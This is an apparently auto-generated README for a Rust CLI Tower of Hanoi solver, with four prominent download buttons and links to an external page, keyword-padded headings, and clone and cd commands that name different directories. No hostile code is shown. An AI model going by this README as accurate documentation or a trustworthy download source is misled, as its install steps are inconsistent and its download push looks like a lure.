# Tower of Hanoi v2026 - algorithm solver 2026

> **Tower of Hanoi is a Rust-based CLI tool for the classic disk-moving puzzle, delivering recursive solution generation, move-by-move tracking, and readable terminal output in its 2026 release.**

[![Platform](https://img.shields.io/badge/Platform-Rust%20CLI-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/felixlabs40/tower-hanoi-2026-cli?style=flat-square)](https://github.com/felixlabs40/tower-hanoi-2026-cli)

---

<p align="center">
  <a href="https://felixlabs40.github.io/tower-hanoi-2026-cli/">
    <img src="https://img.shields.io/badge/Download-Tower%20of%20Hanoi%20Latest-brightgreen?style=for-the-badge" alt="Download Tower of Hanoi">
  </a>
</p>

> **[Direct Download - Tower of Hanoi v2026](https://felixlabs40.github.io/tower-hanoi-2026-cli/)**

---

[Download Latest Build](https://felixlabs40.github.io/tower-hanoi-2026-cli/)

---

## What this project does

Tower of Hanoi is a Rust command-line solver for one of the best-known recursion problems. It builds the shortest move sequence and presents the process in a way that is easy to inspect directly in the terminal.

The repository is aimed at developers, learners, and anyone exploring recursive or divide-and-conquer strategies. With move history, peg-state updates, and built-in validation, it makes the puzzle progression easy to observe from the first disk transfer to the last.

---

## Highlights

- Produces the minimal sequence of moves for the puzzle
- Solves the problem with recursion
- Shows divide-and-conquer behavior in a lightweight CLI format
- Outputs each move step by step for straightforward tracing
- Maintains peg-state updates during execution
- Checks input before running the solver
- Ships with unit tests for important behavior
- Well suited for terminal-based study and experimentation

---

## Installation

Clone the repository and compile it with Rust:

```bash
git clone https://github.com/felixlabs40/tower-hanoi-2026-cli.git
cd tower-of-hanoi
cargo build --release
```

Once compilation finishes, launch the CLI from the binary created under `target/release/`.

---

## Usage

Execute the solver from the project folder and supply the disk count if your build accepts an argument:

```bash
cargo run -- 3
```

Common usage flow:

1. Open a terminal and start the program.
2. Provide the number of disks either as input or an argument.
3. Watch the moves appear one at a time.
4. Track the peg changes until the puzzle is solved.

---

## Configuration

No separate configuration file is included in the extracted metadata. Runtime behavior is controlled through CLI input and the application's internal validation path.

If you expand the solver, keep any additional options close to the command-line parsing code so input handling remains easy to reason about.

---

## Requirements

- Rust toolchain
- Command-line environment
- Enough terminal space to keep the move output readable
- Input values that the solver can validate

---

## FAQ

**How do I get updates?**  
Look for new releases in the repository or rebuild from the latest source.

**Where are the tests?**  
Unit tests are included for the solver's core behavior.

**Can I change how the output looks?**  
Yes. You can adjust the CLI visualization in the Rust source if you want a different format.

**What if the input is invalid?**  
Input validation is built in, so unsupported values should be rejected before the algorithm starts.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
